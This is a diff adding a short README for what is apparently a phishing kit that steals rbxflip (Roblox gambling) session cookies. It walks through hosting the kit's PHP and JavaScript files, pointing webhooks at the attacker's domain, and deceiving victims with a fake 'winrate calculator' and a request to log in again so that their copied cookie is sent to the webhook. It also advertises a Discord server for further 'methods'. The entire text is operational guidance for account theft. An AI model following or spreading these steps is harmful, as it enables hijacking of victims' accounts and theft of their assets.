@@ -1,0 +1,23 @@
+1.) Upload the files to a site (Upload sc.php to a seperate replit/ domain)hoster I recommend using a replit nix web server for small beams(https://replit.com/new/) Or just use https://000webhost.com
+
+2.)Change the webhooks in sc.php to yours
+
+3.)Go into script.js and replace the Domain to your secondary domain (If you want use a subdomain so you don't have to buy 2 different domains or just use your site hosters free domains)
+
+4.)Go in sc.php on the other replit and add your webhook then your main domain
+
+3.)Tell someone you have a rbxflip winrate calculator website and say they have to relogin for it to work
+
+4.)Once they relogin to rbxflip they'll most likely have their cookie copied then have em go to the website.
+
+5.)Cookie will go to your webhook
+
+6.)Won't work if cookie isn't in clipboard
+
+7.)Join https://discord.gg/sUPRXSYMKg for more epic methods
+
+8.)I wanted to make this somewhat easy to edit so the template it super basic. Do't be a skid and please make your own template
+
+9.) Hmu if you have issues Ice Bear#8828
+
+10.) Don't leak theres literally no profit in doing so. Your just ruining your chances of getting good beams.
